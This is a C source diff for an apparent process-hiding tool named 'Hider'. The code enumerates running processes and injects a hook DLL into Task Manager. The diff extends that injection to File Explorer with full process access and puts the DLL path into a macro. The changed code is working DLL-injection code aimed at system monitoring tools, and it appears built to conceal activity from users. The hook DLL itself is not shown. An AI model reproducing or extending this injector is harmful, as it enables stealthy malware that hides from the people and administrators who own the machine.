@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <winternl.h>
 
+#define DLL_PATH  L"C:\\Users\\6appy\\Desktop\\Cprojects\\Hider\\$Build\\x64_Hook.dll"
+
 typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
     _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
     _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
@@ -89,12 +91,17 @@ BOOL SearchForProcess(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
         if (SystemInfo->ImageName.Length && wcscmp(SystemInfo->ImageName.Buffer, L"Taskmgr.exe") == 0) {
             printf("(i) Task Manager has been found. Injecting...\n");
             // dll injection
-            LoadDll(OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleToULong(SystemInfo->UniqueProcessId)), L"C:\\Users\\6appy\\Desktop\\Cprojects\\Hider\\$Build\\x64_Hook.dll");
+            LoadDll(OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleToULong(SystemInfo->UniqueProcessId)), DLL_PATH);
+        }
+        else if (SystemInfo->ImageName.Length && wcscmp(SystemInfo->ImageName.Buffer, L"explorer.exe") == 0) {
+            printf("(*) Injectin File Explorer...\n");
+            LoadDll(OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleToULong(SystemInfo->UniqueProcessId)), DLL_PATH);
         }
         else if (!wcscmp(SystemInfo->ImageName.Buffer, L"Taskmgr.exe") == 0) {
-            printf("(-) Task Manager is not open...\n");
+            printf("(-) Not looking for this process...\n");
 
         }
+        
 
         if (!SystemInfo->NextEntryOffset)
             break;
